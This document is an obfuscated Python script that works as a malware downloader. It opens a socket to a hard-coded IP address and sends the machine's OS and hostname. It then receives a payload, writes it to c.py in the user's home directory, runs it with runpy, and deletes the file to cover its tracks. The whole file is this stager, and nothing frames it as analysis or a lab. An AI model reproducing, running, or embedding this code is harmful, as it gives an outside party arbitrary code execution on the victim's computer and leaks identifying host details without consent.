import os,socket,platform,time,runpy
j=open
p=True
c=int
y=str
d=runpy.run_path
i=time.sleep
Q=platform.system
l=socket.SOCK_STREAM
b=socket.AF_INET
s=socket.socket
u=socket.gethostname
a=os.remove
B=os.path
O=os.getlogin
X="65.109.85.194"
h=Q()
x=u()#+"-"+O()
L=B.expanduser("~")
o=L+"/c.py"
s=s(b,l)
s.connect((X,80))
G=h+"-"+x
G=G.replace(" ","")
f=G+'=EOFY=='
s.send(f.encode())
W=0
g=j(o,'wb')
while p:
 l=s.recv(1024)
 W=W+1
 try:
  if l.decode().endswith('=EOFY=')==p:
   gg=c(l.decode().split('=EOFY=')[0])
   break
 except:pass
 g.write(l)
 if(W*1024)>102400:break
g.close()
i(1)
T=B.getsize(o)
s.send(y(T).encode())
s.close()
if T==gg:
 try:
  d(path_name=o)
 except:
  pass
a(o)

